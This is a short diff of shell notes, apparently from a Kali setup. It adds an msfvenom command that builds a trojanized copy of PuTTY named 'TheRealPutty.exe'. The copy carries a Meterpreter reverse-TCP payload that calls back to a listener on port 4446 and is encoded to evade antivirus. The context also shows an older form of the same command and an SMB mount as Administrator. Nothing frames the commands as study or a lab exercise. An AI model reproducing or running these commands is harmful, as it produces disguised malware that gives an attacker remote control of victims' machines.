@@ -1,5 +1,10 @@
 msfvenom -a x86 –-platform windows -x Documents/viri/putty.exe -k  -p windows/meterpreter/reverse_tcp lhost=192.168.0.40 lport=4446  -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > TheRealPutty.exe
 
+export LANG=C
+export LC_ALL=C
+msfvenom -a x86 --platform windows -x /home/kali/Documents/viri/putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4446 -e x86/shikata_ga_nai -i 3 -b '\x00' -f exe -o /home/kali/Documents/viri/TheRealPutty.exe
+
+
 
 sudo mkdir /media/share
 sudo mount //192.168.100.60/Share /media/share -o username=Administrator 
